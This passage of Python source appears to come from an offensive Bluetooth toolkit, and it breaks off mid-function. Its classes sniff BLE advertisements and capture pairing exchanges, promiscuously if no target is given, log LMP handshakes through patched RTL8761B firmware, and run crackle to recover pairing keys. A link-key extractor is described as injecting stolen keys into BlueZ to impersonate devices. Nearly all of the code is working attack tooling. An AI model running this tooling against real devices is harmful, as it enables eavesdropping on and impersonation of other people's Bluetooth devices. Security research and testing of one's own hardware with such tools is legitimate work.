"""nRF52840 BLE sniffing, DarkFirmware LMP capture, and link key cracking.

Hardware:
  - nRF52840 dongle -- BLE sniffing via Nordic's nRF Sniffer for Bluetooth LE.
    Requires sniffer firmware flashed onto the dongle (see Nordic Semiconductor
    "nRF Sniffer for Bluetooth LE" documentation). Interfaces with Wireshark/tshark
    through the nrf_sniffer_ble extcap plugin, or via nrfutil CLI.

  - RTL8761B (DarkFirmware) -- LMP traffic monitor for BR/EDR link-layer
    visibility.  Captures incoming LMP packets via the firmware's RX hook,
    which logs all LMP traffic as HCI vendor-specific events (0xFF).

Workflow (BLE -- nRF52840):
  1. Scan for BLE advertisers (nrf_sniffer_ble extcap via tshark)
  2. Sniff target BLE connection / pairing exchange
  3. Crack captured pairing to extract LTK (crackle)

Workflow (LMP -- DarkFirmware RTL8761B):
  1. Load DarkFirmware onto RTL8761B adapter
  2. Establish ACL connection to target
  3. Monitor incoming LMP packets (features, auth, encryption negotiation)
  4. Export to BTIDES JSON format

CrackleRunner works on BLE pcaps from any capture source.
LinkKeyExtractor works on BR/EDR pcaps from any capture source.

Software required:
  - tshark (Wireshark CLI) with nrf_sniffer_ble extcap plugin
  - nrfutil (optional, alternative to tshark for nRF52840 sniffing)
  - crackle (BLE pairing cracker)

References:
  - https://infocenter.nordicsemi.com/topic/ug_sniffer_ble/
  - https://github.com/AyoubMouhworking/DarkFirmware_real_i
  - https://github.com/mikeryan/crackle
  - Ryan, M. "Bluetooth: With Low Energy Comes Low Security" USENIX WOOT 2013
"""

import json
import os
import re
import struct
import threading
import time
import signal
import subprocess

from blue_tap.utils.bt_helpers import run_cmd, check_tool
from blue_tap.utils.output import (
    info, success, error, warning, verbose,
    phase, step, substep,
)


# ── nRF52840 BLE Sniffer ──────────────────────────────────────────────────

class NRFBLESniffer:
    """BLE sniffer using nRF52840 dongle with Nordic sniffer firmware.

    Uses the nrf_sniffer_ble Wireshark extcap interface (via tshark) to
    capture BLE advertisements, connections, and pairing exchanges. Falls
    back to nrfutil CLI if the extcap plugin is not available.
    """

    def __init__(self):
        self._proc = None

    @staticmethod
    def is_available() -> bool:
        """Check if nRF52840 sniffer tools are installed."""
        # Check for tshark with nrf_sniffer_ble extcap, or nrfutil
        if check_tool("tshark"):
            # Verify the extcap interface exists
            result = run_cmd(["tshark", "-D"], timeout=10)
            if result.returncode == 0 and "nrf_sniffer_ble" in result.stdout:
                return True
        return check_tool("nrfutil")

    def scan_advertisers(self, duration: int = 30) -> list[dict]:
        """Scan for BLE advertisers using nRF52840 sniffer.

        Captures BLE advertisement packets and extracts advertising
        addresses and device names.

        Returns list of discovered advertisers with address and name.
        """
        if not check_tool("tshark"):
            error("tshark not found. Install: apt install wireshark-cli")
            return []

        with phase("nRF52840 BLE Advertisement Scan"):
            info(f"Scanning for BLE advertisers ({duration}s)...")
            info("Listening on nrf_sniffer_ble extcap interface")

            result = run_cmd(
                [
                    "tshark",
                    "-i", "nrf_sniffer_ble",
                    "-a", f"duration:{duration}",
                    "-Y", "btle.advertising_header",
                    "-T", "fields",
                    "-e", "btle.advertising_address",
                    "-e", "btcommon.eir_ad.entry.device_name",
                ],
                timeout=duration + 15,
            )

            advertisers = []
            if result.returncode == 0 and result.stdout:
                for line in result.stdout.splitlines():
                    parts = line.split("\t")
                    addr = parts[0].strip() if len(parts) >= 1 else ""
                    name = parts[1].strip() if len(parts) >= 2 else ""
                    if addr:
                        entry = {
                            "address": addr.upper(),
                            "name": name or "(unknown)",
                            "raw": line.strip(),
                        }
                        # Deduplicate by address
                        if not any(a["address"] == entry["address"] for a in advertisers):
                            advertisers.append(entry)

                success(f"Found {len(advertisers)} BLE advertiser(s)")
                for a in advertisers:
                    substep(f"{a['address']}  {a['name']}")
            else:
                warning("No BLE advertisers detected (check nRF52840 dongle connection)")
                if result.stderr:
                    verbose(f"stderr: {result.stderr.strip()}")

        return advertisers

    def sniff_connection(
        self,
        target_address: str,
        output_pcap: str = "ble_connection.pcap",
        duration: int = 120,
    ) -> dict:
        """Capture BLE connection to/from a target address.

        Sniffs BLE link-layer traffic involving the target device using
        the nRF52840 sniffer. Output pcap can be analyzed with Wireshark
        or fed to CrackleRunner if pairing was captured.

        Args:
            target_address: Target BLE address (e.g., AA:BB:CC:DD:EE:FF).
            output_pcap: Output pcap file path.
            duration: Capture duration in seconds.
        """
        with phase("nRF52840 BLE Connection Sniff"):
            info(f"Sniffing BLE connection for {target_address} ({duration}s)")
            info(f"Output: {output_pcap}")

            # Prefer tshark with extcap, fall back to nrfutil
            if check_tool("tshark"):
                return self._sniff_via_tshark(target_address, output_pcap, duration)
            elif check_tool("nrfutil"):
                return self._sniff_via_nrfutil(target_address, output_pcap, duration)
            else:
                error("Neither tshark (with nrf_sniffer_ble) nor nrfutil found")
                return {"success": False, "error": "no sniffer tool available"}

    def sniff_pairing(
        self,
        output_pcap: str = "ble_pairing.pcap",
        duration: int = 120,
        target: str | None = None,
    ) -> dict:
        """Capture BLE pairing exchanges for key cracking.

        Captures BLE link-layer traffic including SMP pairing frames
        (Pairing Request, Pairing Response, Pairing Confirm, Pairing Random,
        Encryption Information, Master Identification). The output pcap can
        be fed directly to CrackleRunner.crack_ble() to recover the TK/LTK.

        Args:
            output_pcap: Output pcap file path.
            duration: Capture duration in seconds.
            target: Optional target BLE address to filter on.
                   If None, captures all pairing exchanges (promiscuous).
        """
        with phase("BLE Pairing Sniff"):
            if target:
                info(f"Sniffing BLE pairing for {target} ({duration}s)")
            else:
                info(f"Sniffing all BLE pairing exchanges ({duration}s, promiscuous)")
            info(f"Output: {output_pcap}")

            if check_tool("tshark"):
                return self._sniff_via_tshark(target, output_pcap, duration)
            elif check_tool("nrfutil"):
                if target:
                    return self._sniff_via_nrfutil(target, output_pcap, duration)
                else:
                    # nrfutil requires an address; capture all with no filter
                    return self._sniff_via_nrfutil(None, output_pcap, duration)
            else:
                error("Neither tshark (with nrf_sniffer_ble) nor nrfutil found")
                return {"success": False, "error": "no sniffer tool available"}

    def _sniff_via_tshark(
        self,
        target_address: str | None,
        output_pcap: str,
        duration: int,
    ) -> dict:
        """Capture BLE traffic using tshark with nrf_sniffer_ble extcap."""
        cmd = [
            "tshark",
            "-i", "nrf_sniffer_ble",
            "-a", f"duration:{duration}",
            "-w", output_pcap,
        ]
        if target_address:
            # Two-pass approach: capture all packets, then filter.
            # -Y (display filter) does NOT filter what -w writes to the pcap;
            # -f (capture/BPF filter) doesn't support btle.* display-filter syntax.
            # So we capture everything first, then filter with a second tshark pass.
            addr_filter = target_address.lower().replace("-", ":")
            self._pending_filter = f"btle.advertising_address == {addr_filter}"
        else:
            self._pending_filter = None

        with step("Capturing BLE link layer via tshark"):
            try:
                self._proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                info(f"tshark capture started (PID {self._proc.pid})")

                try:
                    self._proc.wait(timeout=duration + 10)
                except subprocess.TimeoutExpired:
                    self._proc.send_signal(signal.SIGINT)
                    self._proc.wait(timeout=5)

            except FileNotFoundError:
                error("tshark binary not found")
                return {"success": False, "error": "binary not found"}
            except Exception as e:
                error(f"Capture error: {e}")
                return {"success": False, "error": str(e)}
            finally:
                self._proc = None

        # Second pass: filter the pcap if a target address was specified
        if self._pending_filter and os.path.exists(output_pcap):
            filtered_pcap = output_pcap + ".filtered"
            filter_cmd = [
                "tshark", "-r", output_pcap,
                "-Y", self._pending_filter,
                "-w", filtered_pcap,
            ]
            try:
                filter_result = subprocess.run(
                    filter_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=60,
                )
                if filter_result.returncode == 0 and os.path.exists(filtered_pcap):
                    os.replace(filtered_pcap, output_pcap)
                    info("Filtered pcap to target address only")
                else:
                    warning("Post-capture filter failed; pcap contains all packets")
                    if os.path.exists(filtered_pcap):
                        os.remove(filtered_pcap)
            except (subprocess.TimeoutExpired, OSError) as e:
                warning(f"Post-capture filter error: {e}")
                if os.path.exists(filtered_pcap):
                    os.remove(filtered_pcap)

        return self._check_pcap_output(output_pcap, duration, target_address)

    def _sniff_via_nrfutil(
        self,
        target_address: str | None,
        output_pcap: str,
        duration: int,
    ) -> dict:
        """Capture BLE traffic using nrfutil ble-sniffer."""
        cmd = ["nrfutil", "ble-sniffer", "sniff", "--output", output_pcap]
        if target_address:
            addr = target_address.upper().replace("-", ":")
            cmd.extend(["--address", addr])

        with step("Capturing BLE link layer via nrfutil"):
            try:
                self._proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                info(f"nrfutil capture started (PID {self._proc.pid})")

                try:
                    self._proc.wait(timeout=duration)
                except subprocess.TimeoutExpired:
                    self._proc.send_signal(signal.SIGINT)
                    self._proc.wait(timeout=5)

            except FileNotFoundError:
                error("nrfutil binary not found")
                return {"success": False, "error": "binary not found"}
            except Exception as e:
                error(f"Capture error: {e}")
                return {"success": False, "error": str(e)}
            finally:
                self._proc = None

        return self._check_pcap_output(output_pcap, duration, target_address)

    def _check_pcap_output(
        self, output_pcap: str, duration: int, target: str | None
    ) -> dict:
        """Check if pcap output was produced and report results."""
        if os.path.exists(output_pcap):
            size = os.path.getsize(output_pcap)
            success(f"Captured {size} bytes to {output_pcap}")
            result = {
                "success": True,
                "pcap": output_pcap,
                "size": size,
                "duration": duration,
            }
            if target:
                result["target"] = target
            return result
        else:
            warning("No pcap file produced (no BLE traffic captured?)")
            return {"success": False, "error": "no output file"}

    def stop(self):
        """Stop any running capture."""
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGINT)
                self._proc.wait(timeout=5)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                try:
                    self._proc.kill()
                except ProcessLookupError:
                    pass
            self._proc = None
            info("nRF52840 BLE capture stopped")


# ── LMP Packet Filter ────────────────────────────────────────────────────

class LMPFilter:
    """Filter LMP packets by category, direction, or opcode.

    Predefined categories cover security-relevant LMP operations:
      - auth: AU_RAND, SRES, IN_RAND, COMB_KEY, SSP confirm/number/dhkey
      - encryption: ENC_MODE_REQ, KEY_SIZE_REQ, START/STOP_ENC
      - features: VERSION_REQ/RES, FEATURES_REQ/RES
      - security: All of the above combined
    """

    AUTH_OPCODES = {8, 9, 10, 11, 12, 13, 14, 59, 60, 61}
    ENCRYPTION_OPCODES = {15, 16, 17, 18}
    FEATURES_OPCODES = {37, 38, 39, 40}
    SECURITY_OPCODES = AUTH_OPCODES | ENCRYPTION_OPCODES | FEATURES_OPCODES

    def __init__(self, opcodes=None, category=None):
        if category == "auth":
            self.opcodes = self.AUTH_OPCODES
        elif category == "encryption":
            self.opcodes = self.ENCRYPTION_OPCODES
        elif category == "features":
            self.opcodes = self.FEATURES_OPCODES
        elif category == "security":
            self.opcodes = self.SECURITY_OPCODES
        elif opcodes:
            self.opcodes = set(opcodes)
        else:
            self.opcodes = None  # Pass all

        label = category or (f"opcodes={self.opcodes}" if self.opcodes else "all")
        verbose(f"LMPFilter initialized: {label}")

    def matches(self, pkt: dict) -> bool:
        """Return True if the packet passes this filter."""
        if self.opcodes is None:
            return True
        return pkt.get("opcode", 0) in self.opcodes


# ── DarkFirmware LMP Sniffer (RTL8761B) ──────────────────────────────────

class DarkFirmwareSniffer:
    """LMP traffic monitor using DarkFirmware-patched RTL8761B.

    Captures incoming LMP packets via the firmware's RX hook, which logs
    all LMP traffic as HCI vendor-specific events (0xFF).  This enables
    visibility into link-layer negotiation that is normally hidden below
    the HCI boundary.

    Unlike passive sniffers (nRF), this operates as an active
    endpoint -- you must be one end of the Bluetooth connection.  However,
    this captures the pre-encryption LMP handshake in cleartext, which is
    where KNOB, BIAS, and BLUFFS attacks operate.

    Capabilities:
      - Capture LMP metadata for ALL incoming packets (opcode + struct pointer)
      - Capture full LMP payload for packets on the 0x0480 firmware path
      - Export to BTIDES JSON format (compatible with Blue2thprinting)
      - Real-time monitoring with Rich console output

    Limitations:
      - Only captures incoming LMP (outgoing only if sent via VSC echo)
      - Full payload only for 0x0480 code path -- other paths get metadata only
      - Single connection (firmware hardcodes connection index 0)
      - Requires DarkFirmware loaded -- not a passive sniffer
    """

    def __init__(self, hci_dev: int = 1):
        self.hci_dev = hci_dev
        self._vsc = None
        self._packets = []
        self._monitoring = False
        self._filter: LMPFilter | None = None
        self._local_addr: str = ""

    def is_available(self) -> bool:
        """Check if DarkFirmware is loaded on the adapter."""
        try:
            from blue_tap.core.firmware import DarkFirmwareManager
            fw = DarkFirmwareManager()
            return fw.is_darkfirmware_loaded(f"hci{self.hci_dev}")
        except Exception:
            return False

    def start_capture(
        self,
        target=None,
        output="lmp_capture.json",
        duration=120,
        lmp_filter: LMPFilter | None = None,
        output_format: str = "json",
    ):
        """Capture LMP traffic for a duration, save to file.

        Args:
            target: Optional BD_ADDR to connect to (establishes ACL if specified).
            output: Output file path (JSON or pcap).
            duration: Capture duration in seconds.
            lmp_filter: Optional LMPFilter to restrict captured opcodes.
            output_format: ``"json"`` (BTIDES v2) or ``"pcap"`` (Wireshark).

        Returns:
            dict with success, packets count, output path, duration.
        """
        from blue_tap.core.hci_vsc import HCIVSCSocket

        self._filter = lmp_filter
        result = {"success": False, "packets": 0, "output": output, "duration": 0}

        try:
            self._vsc = HCIVSCSocket(self.hci_dev)
            self._vsc.open()
            self._packets = []
            self._monitoring = True
            self._local_addr = self._resolve_local_addr()

            info(f"Starting LMP capture on hci{self.hci_dev} (duration={duration}s)")
            if lmp_filter and lmp_filter.opcodes is not None:
                info(f"Filter active: {len(lmp_filter.opcodes)} opcodes")

            # If target specified, try to establish connection
            if target:
                import socket as _socket
                probe = None
                try:
                    probe = _socket.socket(31, _socket.SOCK_SEQPACKET, 0)  # L2CAP
                    probe.settimeout(5.0)
                    probe.connect((target, 1))  # PSM 1 = SDP
                    info(f"ACL connection established to {target}")
                except OSError as e:
                    warning(f"Could not connect to {target}: {e}")
                finally:
                    if probe:
                        try:
                            probe.close()
                        except OSError:
                            pass

            self._vsc.start_lmp_monitor(self._on_packet)

            start = time.time()
            try:
                while time.time() - start < duration and self._monitoring:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                pass

            elapsed = time.time() - start
            self._vsc.stop_lmp_monitor()
            self._vsc.close()
            self._vsc = None

            # Export in requested format
            if output_format == "pcap":
                export_ok = self.export_pcap(self._packets, output)
                if not export_ok:
                    error("PCAP export failed")
            else:
                btides_data = self._export_btides(target)
                with open(output, "w") as f:
                    json.dump(btides_data, f, indent=2)

            result["success"] = True
            result["packets"] = len(self._packets)
            result["duration"] = round(elapsed, 1)
            success(f"Captured {len(self._packets)} LMP packets in {elapsed:.1f}s")

        except Exception as exc:
            error(f"LMP capture failed: {exc}")
            if self._vsc:
                try:
                    self._vsc.stop_lmp_monitor()
                    self._vsc.close()
                except Exception:
                    pass
                self._vsc = None

        return result

    def monitor(
        self,
        target=None,
        duration=0,
        callback=None,
        lmp_filter: LMPFilter | None = None,
        dashboard: bool = False,
    ):
        """Real-time LMP packet monitor with console output.

        Args:
            target: Optional target address.
            duration: Duration in seconds (0 = until Ctrl-C).
            callback: Optional callback for each packet.
            lmp_filter: Optional LMPFilter to restrict displayed opcodes.
            dashboard: If True, use Rich Live dashboard display.
        """
        from blue_tap.core.hci_vsc import HCIVSCSocket

        self._filter = lmp_filter
        self._vsc = HCIVSCSocket(self.hci_dev)
        self._vsc.open()
        self._packets = []
        self._monitoring = True
        self._local_addr = self._resolve_local_addr()

        # Establish connection if target given
        if target:
            import socket as _socket
            probe = None
            try:
                probe = _socket.socket(31, _socket.SOCK_SEQPACKET, 0)
                probe.settimeout(5.0)
                probe.connect((target, 1))
                info(f"ACL connection established to {target}")
            except OSError:
                warning(f"Could not connect to {target}")
            finally:
                if probe:
                    try:
                        probe.close()
                    except OSError:
                        pass

        # Optionally start the Rich dashboard
        _dashboard = None
        if dashboard:
            try:
                from blue_tap.ui.dashboard import AttackDashboard
                _dashboard = AttackDashboard(target=target or "")
                _dashboard.start()
                info("Rich dashboard started")
            except Exception as exc:
                warning(f"Dashboard unavailable, falling back to console: {exc}")
                _dashboard = None

        def _on_monitor_packet(pkt):
            pkt["timestamp"] = time.time()
            pkt["direction"] = "rx"
            if self._filter and not self._filter.matches(pkt):
                return
            self._packets.append(pkt)
            if _dashboard:
                _dashboard.on_lmp_packet(pkt)
            else:
                self._print_lmp_packet(pkt)
            if callback:
                callback(pkt)

        self._vsc.start_lmp_monitor(_on_monitor_packet)

        info(f"LMP monitor started on hci{self.hci_dev}" +
             (f" target={target}" if target else "") +
             " (Ctrl-C to stop)")

        start = time.time()
        try:
            while self._monitoring:
                if duration > 0 and time.time() - start >= duration:
                    break
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            if _dashboard:
                try:
                    _dashboard.stop()
                except Exception:
                    pass
            # Ensure cleanup even on unexpected exceptions
            if self._vsc is not None:
                try:
                    self._vsc.stop_lmp_monitor()
                    self._vsc.close()
                except Exception:
                    pass
                self._vsc = None
        info(f"Captured {len(self._packets)} LMP packets")

    def stop(self):
        """Stop ongoing capture/monitor."""
        self._monitoring = False

    def _on_packet(self, pkt):
        """Internal callback -- timestamp, filter, and accumulate packets."""
        pkt["timestamp"] = time.time()
        pkt["direction"] = "rx"
        if self._filter and not self._filter.matches(pkt):
            return
        self._packets.append(pkt)

    @staticmethod
    def _print_lmp_packet(pkt):
        """Print a single LMP packet to console."""
        opcode = pkt.get("opcode", 0)
        payload = pkt.get("payload", b"")

        # Try to resolve opcode name
        try:
            from blue_tap.fuzz.protocols.lmp import COMMAND_NAMES
            name = COMMAND_NAMES.get(opcode, f"Unknown(0x{opcode:04x})")
        except ImportError:
            name = f"0x{opcode:04x}"

        data_str = payload.hex() if payload else "(metadata only)"
        info(f"  LMP RX: {name} | data={data_str}")

    def _resolve_local_addr(self) -> str:
        """Resolve the local BD_ADDR for hci_dev."""
        try:
            result = run_cmd(["hciconfig", f"hci{self.hci_dev}"], timeout=5)
            if result.returncode == 0:
                m = re.search(r"BD Address:\s*([0-9A-Fa-f:]{17})", result.stdout)
                if m:
                    return m.group(1).upper()
        except Exception:
            pass
        return "unknown"

    @staticmethod
    def _decode_lmp_params(opcode: int, payload: bytes) -> dict:
        """Decode LMP parameters for known opcodes.

        Returns decoded fields for security-relevant opcodes:
        features bitmap, version info, and key size.
        """
        decoded: dict = {}
        try:
            from blue_tap.fuzz.protocols.lmp import COMMAND_NAMES
            decoded["opcode_name"] = COMMAND_NAMES.get(opcode, f"Unknown(0x{opcode:04x})")
        except ImportError:
            decoded["opcode_name"] = f"0x{opcode:04x}"

        # LMP_FEATURES_RES (opcode 40): 8-byte features bitmap
        if opcode == 40 and len(payload) >= 8:
            decoded["features_hex"] = payload[:8].hex()
        # LMP_VERSION_RES (opcode 38): version + company_id + subversion
        elif opcode == 38 and len(payload) >= 5:
            decoded["bt_version"] = payload[0]
            decoded["company_id"] = int.from_bytes(payload[1:3], "little")
            decoded["subversion"] = int.from_bytes(payload[3:5], "little")
        # LMP_ENCRYPTION_KEY_SIZE_REQ (opcode 16): key size
        elif opcode == 16 and len(payload) >= 1:
            decoded["key_size"] = payload[0]

        return decoded

    def _export_btides(self, target=None):
        """Export captured packets in BTIDES v2 JSON format.

        BTIDES v2 envelope wraps captures with format metadata,
        timestamps on each packet, direction field, and decoded
        parameters for known opcodes.
        """
        lmp_array = []
        for pkt in self._packets:
            opcode = pkt.get("opcode", 0)
            payload = pkt.get("payload", b"")
            entry: dict = {
                "opcode": opcode,
                "has_full_data": pkt.get("has_data", False),
                "timestamp": pkt.get("timestamp", 0.0),
                "direction": pkt.get("direction", "rx"),
            }
            if payload:
                entry["full_pkt_hex_str"] = payload.hex()
            # Decode known opcode parameters
            decoded = self._decode_lmp_params(opcode, payload)
            if decoded:
                entry["decoded"] = decoded
            lmp_array.append(entry)

        captures = [{
            "bdaddr": target or "unknown",
            "bdaddr_local": self._local_addr,
            "bdaddr_rand": 0,
            "capture_method": "darkfirmware_rtl8761b",
            "LMPArray": lmp_array,
        }]

        info(f"Exported {len(lmp_array)} packets in BTIDES v2 format")
        return {
            "format": "btides",
            "version": 2,
            "captures": captures,
        }

    def export_pcap(self, packets: list, output: str) -> bool:
        """Export captured LMP packets as pcap file.

        Uses pcap format with DLT_BLUETOOTH_HCI_H4_WITH_PHDR (201) link type.
        Each packet gets a pcap record with timestamp and HCI vendor event wrapper.

        Args:
            packets: List of packet dicts from capture/monitor.
            output: Output file path.

        Returns:
            True on success, False on error.
        """
        try:
            with open(output, "wb") as f:
                # PCAP global header
                f.write(struct.pack(
                    "<IHHiIII",
                    0xA1B2C3D4,  # magic
                    2, 4,        # version 2.4
                    0,           # thiszone
                    0,           # sigfigs
                    65535,       # snaplen
                    201,         # DLT_BLUETOOTH_HCI_H4_WITH_PHDR
                ))

                for pkt in packets:
                    ts = pkt.get("timestamp", time.time())
                    ts_sec = int(ts)
                    ts_usec = int((ts - ts_sec) * 1_000_000)

                    payload = pkt.get("payload", b"")
                    opcode = pkt.get("opcode", 0)

                    # HCI direction: 0x01 = received from controller
                    hci_direction = struct.pack("<I", 0x01)
                    # HCI event packet indicator (0x04) + vendor event (0xFF)
                    # length = 1 (sub-event) + 2 (opcode LE) + len(payload)
                    inner_len = 1 + 2 + len(payload)
                    hci_header = bytes([0x04, 0xFF, inner_len & 0xFF])
                    # Sub-event 0x01 (LMP log), opcode LE16
                    lmp_meta = bytes([0x01]) + struct.pack("<H", opcode)
                    data = hci_direction + hci_header + lmp_meta + payload

                    # Packet record header
                    f.write(struct.pack(
                        "<IIII",
                        ts_sec, ts_usec,
                        len(data), len(data),
                    ))
                    f.write(data)

            success(f"PCAP exported: {output} ({len(packets)} packets)")
            return True
        except Exception as exc:
            error(f"PCAP export failed: {exc}")
            return False


# ── Combined BLE + LMP Sniffer ─────────────────────────────────────────────

class CombinedSniffer:
    """Simultaneous BLE (nRF52840) and LMP (DarkFirmware) monitoring.

    Runs both sniffers concurrently with a correlated output timeline.
    BLE captures advertisements and pairing; LMP captures link-layer
    negotiation.  Together they cover the full attack surface.
    """

    def __init__(self, nrf_available=True, darkfirmware_available=True, hci_dev=1):
        self._nrf = NRFBLESniffer() if nrf_available else None
        self._df = DarkFirmwareSniffer(hci_dev=hci_dev) if darkfirmware_available else None
        self._events: list[dict] = []  # Unified timeline
        self._lock = threading.Lock()

        sources = []
        if self._nrf:
            sources.append("nRF52840-BLE")
        if self._df:
            sources.append("DarkFirmware-LMP")
        info(f"CombinedSniffer initialized with: {', '.join(sources) or 'none'}")

    def monitor(self, target=None, duration=60) -> dict:
        """Run both sniffers with unified timeline output.

        Args:
            target: Optional target BD_ADDR.
            duration: Capture duration in seconds.

        Returns:
            dict with combined events, counts per source, and success flag.
        """
        self._events = []
        threads: list[threading.Thread] = []

        info(f"Starting combined monitor (duration={duration}s)")

        if self._df:
            def _run_df():
                try:
                    def _lmp_cb(pkt):
                        pkt_copy = dict(pkt)
                        pkt_copy["_source"] = "lmp"
                        pkt_copy["_time"] = time.time()
                        with self._lock:
                            self._events.append(pkt_copy)
                    self._df.monitor(
                        target=target,
                        duration=duration,
                        callback=_lmp_cb,
                    )
                except Exception as exc:
                    error(f"DarkFirmware monitor error: {exc}")

            t = threading.Thread(target=_run_df, daemon=True)
            threads.append(t)

        if self._nrf:
            def _run_nrf():
                try:
                    pcap = f"combined_ble_{int(time.time())}.pcap"
                    result = self._nrf.sniff_connection(
                        target_address=target or "",
                        output_pcap=pcap,
                        duration=duration,
                    )
                    with self._lock:
                        self._events.append({
                            "_source": "ble",
                            "_time": time.time(),
                            "type": "ble_capture_complete",
                            "pcap": pcap,
                            "result": result,
                        })
                except Exception as exc:
                    error(f"nRF BLE monitor error: {exc}")

            t = threading.Thread(target=_run_nrf, daemon=True)
            threads.append(t)

        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=duration + 15)

        # Sort by timestamp
        self._events.sort(key=lambda e: e.get("_time", 0))

        lmp_count = sum(1 for e in self._events if e.get("_source") == "lmp")
        ble_count = sum(1 for e in self._events if e.get("_source") == "ble")
        success(f"Combined capture complete: {lmp_count} LMP + {ble_count} BLE events")

        return {
            "success": True,
            "events": self._events,
            "lmp_count": lmp_count,
            "ble_count": ble_count,
            "duration": duration,
        }

    def export(self, output: str = "combined_capture.json") -> bool:
        """Export combined capture to JSON with source tags.

        Args:
            output: Output file path.

        Returns:
            True on success.
        """
        try:
            export_data = {
                "format": "combined_capture",
                "version": 1,
                "total_events": len(self._events),
                "events": [],
            }
            for evt in self._events:
                entry: dict = {
                    "source": evt.get("_source", "unknown"),
                    "timestamp": evt.get("_time", 0),
                }
                # Copy relevant fields (skip internal keys)
                for k, v in evt.items():
                    if k.startswith("_"):
                        continue
                    if isinstance(v, bytes):
                        entry[k] = v.hex()
                    else:
                        entry[k] = v
                export_data["events"].append(entry)

            with open(output, "w") as f:
                json.dump(export_data, f, indent=2, default=str)

            success(f"Combined capture exported: {output} ({len(self._events)} events)")
            return True
        except Exception as exc:
            error(f"Combined export failed: {exc}")
            return False


# ── Crackle Link Key Cracker ────────────────────────────────────────────────

class CrackleRunner:
    """Wrapper for Crackle — BLE pairing cracker.

    Crackle recovers the Temporary Key (TK) and Long Term Key (LTK) from
    a captured BLE pairing exchange. For Legacy Pairing (BT 4.0-4.1),
    the TK is 0 for Just Works or a 6-digit PIN for Passkey Entry —
    both trivially crackable.

    For LE Secure Connections (BT 4.2+), Crackle cannot crack the pairing
    directly, but can decrypt traffic if the TK/LTK is known.

    Limitations:
      - Only works on BLE (not Classic BR/EDR)
      - Requires captured pairing exchange (not just encrypted traffic)
      - LE Secure Connections with Numeric Comparison is NOT crackable
    """

    @staticmethod
    def is_available() -> bool:
        return check_tool("crackle")

    def crack_ble(self, pcap_file: str, output_pcap: str | None = None) -> dict:
        """Run Crackle on a captured BLE pairing exchange.

        Args:
            pcap_file: Input pcap with BLE pairing traffic.
            output_pcap: Optional output pcap with decrypted traffic.

        Returns:
            Dict with tk, ltk, success status, and crackle output.
        """
        if not self.is_available():
            error("crackle not found. Install: https://github.com/mikeryan/crackle")
            return {"success": False, "error": "crackle not installed"}

        if not os.path.exists(pcap_file):
            error(f"Pcap file not found: {pcap_file}")
            return {"success": False, "error": "file not found"}

        with phase("BLE Key Cracking"):
            cmd = ["crackle", "-i", pcap_file]
            if output_pcap:
                cmd.extend(["-o", output_pcap])
                info(f"Decrypted output: {output_pcap}")

            info(f"Running Crackle on {pcap_file}...")

            with step("Cracking BLE Temporary Key"):
                result = run_cmd(cmd, timeout=300)

            output = result.stdout + result.stderr
            verbose(f"Crackle output:\n{output}")

            parsed = self._parse_crackle_output(output)

            if parsed.get("tk"):
                success(f"TK recovered: {parsed['tk']}")
            if parsed.get("ltk"):
                success(f"LTK recovered: {parsed['ltk']}")
            if parsed.get("success"):
                success("Pairing cracked successfully")
            else:
                if "Secure Connections" in output:
                    warning("LE Secure Connections detected — not crackable by Crackle")
                elif "no pairing" in output.lower():
                    warning("No pairing exchange found in capture")
                else:
                    warning("Crackle did not recover keys")

        return parsed

    def _parse_crackle_output(self, output: str) -> dict:
        """Parse Crackle stdout for recovered keys."""
        result = {
            "success": False,
            "tk": None,
            "ltk": None,
            "raw_output": output,
        }

        # Crackle output patterns:
        # "TK found: 000000"
        # "LTK found: aabbccdd..."
        # "Successfully cracked"
        tk_m = re.search(r"TK\s*(?:found|=)[:\s]+([0-9A-Fa-f]+)", output)
        if tk_m:
            result["tk"] = tk_m.group(1)

        ltk_m = re.search(r"LTK\s*(?:found|=)[:\s]+([0-9A-Fa-f]+)", output)
        if ltk_m:
            result["ltk"] = ltk_m.group(1)

        if result["tk"] or result["ltk"] or "successfully" in output.lower():
            result["success"] = True

        return result


# ── BR/EDR Link Key Extraction ──────────────────────────────────────────────

class LinkKeyExtractor:
    """Extract and inject BR/EDR link keys for Classic Bluetooth impersonation.

    After capturing a BR/EDR pairing exchange (via DarkFirmware LMP capture), the link key
    can sometimes be derived from the captured LMP packets. This class also
    handles injecting recovered link keys into BlueZ's storage so that
    bluetoothctl can connect using the stolen key.

    BlueZ stores link keys in:
      /var/lib/bluetooth/<adapter_mac>/<remote_mac>/info

    The [LinkKey] section contains:
      Key=<hex_key>
      Type=<type>
      PINLength=<length>
    """

    BLUEZ_BT_DIR = "/var/lib/bluetooth"

    def extract_from_pcap(self, pcap_file: str) -> dict:
        """Attempt to extract BR/EDR link key from captured pairing pcap.

        Uses tshark to parse LMP pairing frames. Only works if the full
        pairing exchange was captured (both Kinit and link key derivation).

        Note: This is opportunistic. BR/EDR E21/E22 key derivation from
        captured traffic requires knowing or brute-forcing the PIN. For
        SSP (Secure Simple Pairing), the ECDH exchange means passive
        sniffing alone cannot recover the link key.
        """
        if not check_tool("tshark"):
            warning("tshark not found — cannot parse pcap for link keys")
            return {"success": False, "error": "tshark not installed"}

        if not os.path.exists(pcap_file):
            error(f"Pcap not found: {pcap_file}")
            return {"success": False, "error": "file not found"}

        with phase("BR/EDR Link Key Extraction"):
            info(f"Analyzing {pcap_file} for pairing frames...")

            # Extract LMP pairing-related frames
            result = run_cmd([
                "tshark", "-r", pcap_file,
                "-Y", "btlmp.op == 11 || btlmp.op == 12 || btlmp.op == 17",
                "-T", "fields",
                "-e", "btlmp.op",
                "-e", "btlmp.key",
            ], timeout=30)

            if result.returncode != 0:
                warning(f"tshark failed: {result.stderr.strip()}")
                return {"success": False, "error": "tshark parse failed"}

            # Look for key material in output
            keys = []
            for line in result.stdout.splitlines():
                parts = line.split("\t")
                if len(parts) >= 2 and parts[1]:
                    key_hex = parts[1].replace(":", "").strip()
                    if len(key_hex) == 32:  # 128-bit link key
                        keys.append(key_hex.upper())

            if keys:
